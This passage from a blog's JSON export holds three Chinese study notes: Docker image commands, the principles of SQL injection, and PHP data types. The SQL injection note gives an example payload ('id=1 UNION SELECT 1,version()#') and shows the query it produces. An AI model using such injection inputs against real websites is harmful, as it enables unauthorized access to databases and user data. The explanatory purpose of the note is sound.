命令","date":"2021-10-05T14:45:23.000Z","path":"2021/10/05/docker命令大全-本地镜像管理与infoversion/","text":"本地镜像管理本文取自https://www.runoob.com/docker/docker-rm-command.html，博主整理这些命令主要是方便自己或其他需要的人来查阅 (1)docker images : 列出本地镜像。 语法docker images [OPTIONS] [REPOSITORY[:TAG]]OPTIONS说明： -a :列出本地所有的镜像（含中间映像层，默认情况下，过滤掉中间映像层）； –digests :显示镜像的摘要信息； -f :显示满足条件的镜像； –format :指定返回值的模板文件； –no-trunc :显示完整的镜像信息； -q :只显示镜像ID。 实例查看本地镜像列表。 runoob@runoob:~$ docker images REPOSITORY TAG IMAGE ID CREATED SIZE mymysql v1 37af1236adef 5 minutes ago 329 MB runoob/ubuntu v4 1c06aa18edee 2 days ago 142.1 MB &lt;none&gt; &lt;none&gt; 5c6e1090e771 2 days ago 165.9 MB httpd latest ed38aaffef30 11 days ago 195.1 MB alpine latest 4e38e38c8ce0 2 weeks ago 4.799 MB mongo 3.2 282fd552add6 3 weeks ago 336.1 MB redis latest 4465e4bcad80 3 weeks ago 185.7 MB php 5.6-fpm 025041cd3aa5 3 weeks ago 456.3 MB python 3.5 045767ddf24a 3 weeks ago 684.1 MB …列出本地镜像中REPOSITORY为ubuntu的镜像列表。 root@runoob:~# docker images ubuntu REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu 14.04 90d5884b1ee0 9 weeks ago 188 MB ubuntu 15.10 4e3b13c8a266 3 months ago 136.3 MB (2)docker rmi : 删除本地一个或多个镜像。 语法docker rmi [OPTIONS] IMAGE [IMAGE…]OPTIONS说明： -f :强制删除； –no-prune :不移除该镜像的过程镜像，默认移除； 实例强制删除本地镜像 runoob/ubuntu:v4。 root@runoob:~# docker rmi -f runoob/ubuntu:v4 Untagged: runoob/ubuntu:v4 Deleted: sha256:1c06aa18edee44230f93a90a7d88139235de12cd4c089d41eed8419b503072be Deleted: sha256:85feb446e89a28d58ee7d80ea5ce367eebb7cec70f0ec18aa4faa874cbd97c73 (3)docker tag : 标记本地镜像，将其归入某一仓库。 语法docker tag [OPTIONS] IMAGE[:TAG] [REGISTRYHOST/][USERNAME/]NAME[:TAG] 实例将镜像ubuntu:15.10标记为 runoob/ubuntu:v3 镜像。 root@runoob:~# docker tag ubuntu:15.10 runoob/ubuntu:v3 root@runoob:~# docker images runoob/ubuntu:v3 REPOSITORY TAG IMAGE ID CREATED SIZE runoob/ubuntu v3 4e3b13c8a266 3 months ago 136.3 MB (4)docker build 命令用于使用 Dockerfile 创建镜像。 语法docker build [OPTIONS] PATH | URL | -OPTIONS说明： –build-arg=[] :设置镜像创建时的变量； –cpu-shares :设置 cpu 使用权重； –cpu-period :限制 CPU CFS周期； –cpu-quota :限制 CPU CFS配额； –cpuset-cpus :指定使用的CPU id； –cpuset-mems :指定使用的内存 id； –disable-content-trust :忽略校验，默认开启； -f :指定要使用的Dockerfile路径； –force-rm :设置镜像过程中删除中间容器； –isolation :使用容器隔离技术； –label=[] :设置镜像使用的元数据； -m :设置内存最大值； –memory-swap :设置Swap的最大值为内存+swap，”-1”表示不限swap； –no-cache :创建镜像的过程不使用缓存； –pull :尝试去更新镜像的新版本； –quiet, -q :安静模式，成功后只输出镜像 ID； –rm :设置镜像成功后删除中间容器； –shm-size :设置/dev/shm的大小，默认值是64M； –ulimit :Ulimit配置。 –squash :将 Dockerfile 中所有的操作压缩为一层。 –tag, -t: 镜像的名字及标签，通常 name:tag 或者 name 格式；可以在一次构建中为一个镜像设置多个标签。 –network: 默认 default。在构建期间设置RUN指令的网络模式 实例使用当前目录的 Dockerfile 创建镜像，标签为 runoob/ubuntu:v1。 docker build -t runoob/ubuntu:v1 . 使用URL github.com/creack/docker-firefox 的 Dockerfile 创建镜像。 docker build github.com/creack/docker-firefox 也可以通过 -f Dockerfile 文件的位置： $ docker build -f /path/to/a/Dockerfile . 在 Docker 守护进程执行 Dockerfile 中的指令前，首先会对 Dockerfile 进行语法检查，有语法错误时会返回： $ docker build -t test/myapp . Sending build context to Docker daemon 2.048 kB Error response from daemon: Unknown instruction: RUNCMD (5)docker history : 查看指定镜像的创建历史。 语法docker history [OPTIONS] IMAGE OPTIONS说明： -H :以可读的格式打印镜像大小和日期，默认为true； –no-trunc :显示完整的提交记录； -q :仅列出提交记录ID。 实例查看本地镜像runoob/ubuntu:v3的创建历史。 root@runoob:~# docker history runoob/ubuntu:v3 IMAGE CREATED CREATED BY SIZE COMMENT 4e3b13c8a266 3 months ago /bin/sh -c #(nop) CMD [&quot;/bin/bash&quot;] 0 B &lt;missing&gt; 3 months ago /bin/sh -c sed -i &#39;s/^#\\s*\\(deb.*universe\\)$/ 1.863 kB &lt;missing&gt; 3 months ago /bin/sh -c set -xe &amp;&amp; echo &#39;#!/bin/sh&#39; &gt; /u 701 B &lt;missing&gt; 3 months ago /bin/sh -c #(nop) ADD file:43cb048516c6b80f22 136.3 MB (6)docker save : 将指定镜像保存成 tar 归档文件。 语法docker save [OPTIONS] IMAGE [IMAGE…] OPTIONS 说明： -o :输出到的文件。 实例将镜像 runoob/ubuntu:v3 生成 my_ubuntu_v3.tar 文档 runoob@runoob:~$ docker save -o my_ubuntu_v3.tar runoob/ubuntu:v3 runoob@runoob:~$ ll my_ubuntu_v3.tar -rw------- 1 runoob runoob 142102016 Jul 11 01:37 my_ubuntu_v3.ta (7)docker load : 导入使用 docker save 命令导出的镜像。 语法docker load [OPTIONS] OPTIONS 说明： –input , -i : 指定导入的文件，代替 STDIN。 –quiet , -q : 精简输出信息。 实例导入镜像： $ docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE $ docker load &lt; busybox.tar.gz Loaded image: busybox:latest $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE busybox latest 769b9341d937 7 weeks ago 2.489 MB $ docker load --input fedora.tar Loaded image: fedora:rawhide Loaded image: fedora:20 $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE busybox latest 769b9341d937 7 weeks ago 2.489 MB fedora rawhide 0d20aec6529d 7 weeks ago 387 MB fedora 20 58394af37342 7 weeks ago 385.5 MB fedora heisenbug 58394af37342 7 weeks ago 385.5 MB fedora latest 58394af37342 7 weeks ago 385.5 MB (8)docker import : 从归档文件中创建镜像。 语法docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]] OPTIONS说明： -c :应用docker 指令创建镜像； -m :提交时的说明文字； 实例从镜像归档文件my_ubuntu_v3.tar创建镜像，命名为runoob/ubuntu:v4 runoob@runoob:~$ docker import my_ubuntu_v3.tar runoob/ubuntu:v4 sha256:63ce4a6d6bc3fabb95dbd6c561404a309b7bdfc4e21c1d59fe9fe4299cbfea39 runoob@runoob:~$ docker images runoob/ubuntu:v4 REPOSITORY TAG IMAGE ID CREATED SIZE runoob/ubuntu v4 63ce4a6d6bc3 20 seconds ago 142.1 MB Docker info 命令(1)docker info : 显示 Docker 系统信息，包括镜像和容器数。。 语法docker info [OPTIONS] 实例查看docker系统信息。 $ docker info Containers: 12 Images: 41 Storage Driver: aufs Root Dir: /var/lib/docker/aufs Backing Filesystem: extfs Dirs: 66 Dirperm1 Supported: false Execution Driver: native-0.2 Logging Driver: json-file Kernel Version: 3.13.0-32-generic Operating System: Ubuntu 14.04.1 LTS CPUs: 1 Total Memory: 1.954 GiB Name: iZ23mtq8bs1Z ID: M5N4:K6WN:PUNC:73ZN:AONJ:AUHL:KSYH:2JPI:CH3K:O4MK:6OCX:5OYW (2)docker version :显示 Docker 版本信息。 语法docker version [OPTIONS] OPTIONS说明： -f :指定返回值的模板文件。 实例显示 Docker 版本信息。 $ docker version Client: Version: 1.8.2 API version: 1.20 Go version: go1.4.2 Git commit: 0a8c2e3 Built: Thu Sep 10 19:19:00 UTC 2015 OS/Arch: linux/amd64 Server: Version: 1.8.2 API version: 1.20 Go version: go1.4.2 Git commit: 0a8c2e3 Built: Thu Sep 10 19:19:00 UTC 2015 OS/Arch: linux/amd64","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"SQL 注入原理分析（学习笔记）","date":"2021-10-02T14:45:23.000Z","path":"2021/10/02/sql注入原理/","text":"SQL 注入原理分析（学习笔记）1.SQL语言介绍 ​ SQL 全称是“结构化查询语言( Structured Query Language)”, 最早是IBM的圣约瑟研究实验室为其关系数据库管理系统SYSTEMR开发的一种查询语言,它的前身是SQUARE语言。SQL语言结构简洁,功能强大,简单易学,所以自从IBM公司1981年推出以来, SQL语言得到了广泛的应用。 ​ 结构化查询语言SQL是一种介于关系代数与关系演算之间的语言,其功能包括查询、操纵、定义和控制四个方面,是一个通用的功能极强的关系数据库标准语言。在SQL语言中不需要告诉SQL如何访问数据库,只要告诉SQL需要数据库做什么。 2.SQL注入产生原因 ​ 在现在网络技术于信息技术高速发展的时代，越来越多程序编写应用于B/S模式，而BS模式建立在互联网上，对安全的控制能力较弱，由于开发人员的水平和经验参差不齐，相当一部分的程序员编写代码没有对用户输入的数据或者是页面中所携带的信息进行必要的合法性判断。攻击者利用这个机会提交一段数据库查询代码，根据程序返回的结果，就可以获得一些数据库信息。 3.SQL注入核心原理 ​ SQL注入（SQLi）是一种注入攻击，可以执行恶意SQL语句。它通过将任意SQL代码插入数据库查询，使攻击者能够完全控制Web应用程序后面的数据库服务器。攻击者可以使用SQL注入漏洞绕过应用程序安全措施；可以绕过网页或Web应用程序的身份验证和授权，并检索整个SQL数据库的内容；还可以使用SQL注入来添加，修改和删除数据库中的记录。 ​ SQL注入漏洞可能会影响使用SQL数据库（如MySQL，Oracle，SQL Server或其他）的任何网站或Web应用程序。犯罪分子可能会利用它来未经授权访问用户的敏感数据：客户信息，个人数据，商业机密，知识产权等。SQL注入攻击是最古老，最流行，最危险的Web应用程序漏洞之一。 4.四程WEB框架 ps.灵活的SQL查询语句+用户输入的数据代入了SQL语句=用户直接操作数据库—&gt;SQL注入漏洞 5.用户输入可控，代码对用户输入进行了对接，带入SQL语句，产生SQL注入漏洞 eg：http://xxx.com/index.php?id=1 UNION SELECT 1,version()# ​ ↑ ↑ 正常输入 用户输入可自由控制 select id,location from jobs where id=1——返回id为1的location select id,location from jobs where id =1 union select 1,version()# ——返回id为1的location和数据库文本","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"php 初学笔记","date":"2021-09-18T13:45:23.000Z","path":"2021/09/18/php初学笔记/","text":"#PHP 初学笔记——数据类型1.# 概念 # PHP（PHP: Hypertext Preprocessor）即“超文本预处理器”，是在服务器端执行的脚本语言，尤其适用于Web开发并可嵌入HTML中。PHP语法学习了C语言，吸纳Java和Perl多个语言的特色发展出自己的特色语法，并根据它们的长项持续改进提升自己，例如java的面向对象编程，该语言当初创建的主要目标是让开发人员快速编写出优质的web网站。 PHP同时支持面向对象和面向过程的开发，使用上非常灵活。 2.# 数据类型 # a.PHP支持8种数据类型： （1）integer-整形：只能整数，也可以正数或负数。 （2）folat-浮点型：是数字，和整形数据不同的是它有小数位。 （3）string-字符串型：是字符串，连续的字符序列，可以是计算机所能表示的一切字符的集合。 （4）boolean-布尔型：只有两个值真和假。 （5）array-数组：储存相同数据类型的多个数据项 （6）object-对象：储存类的实例 （7）resource-资源：储存着到外部资源的应用，如打开文件、数据库连接、图形画布区域等 （8）null-空：没有被赋值、已经被重置或赋值为null的变量。 b.PHP数据类型的转换： PHP变量的数据类型是由付给它的值决定的，不用像C语言一样事先声明。 （1）（int）、（integer）：转换成整形——(int)$boo,(integer)$str （float）、（double）、（real）：转换成浮点型——(float)$str,(doubel)$str,(real)$str （string）：转换成字符串————(string)$boo （bool）、（boolean）：转换成布尔类型————(bool)$num,(boolean)$str （array）：转换成数组————(array)$str （object）：转换成对象————(object)$str （unset）:转换为null————(unset)$str （2）ps. 1.&quot;=&quot;是赋值操作符。 2.在进行数据类型转换过程中应注意：转换布尔型时，null、0和未赋值的变量或数组会被转换成false，其它为true。 3.当转换成整形时，布尔型数据的false转换为0，true转换为1，浮点型的小数部分被舍去，字符串型数据如果以小数开头则截取到非数字位，否则转换为0。 4.数据类型转换还可以通过set-type（）函数完成，该函数可以将指点的变量转换为指定的数据类型。————bool settype(mixed $var,string $type) 5.参数type有7个可选值：boolean、float、integer、array、null、object和string如果转换成功，则返回true，否则返回false。 6.当将字符串转换为整形数据时，如果字符串是以数字开头的，那么先将数字部分转换为整形，在舍去后面的字符串；如果数字中含有小数点，那么截取到小数点前一位。 （3）检测数据类型 1&gt; 2&gt;例子 in_numeric()检测变量是否由数字组成 结果","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]}]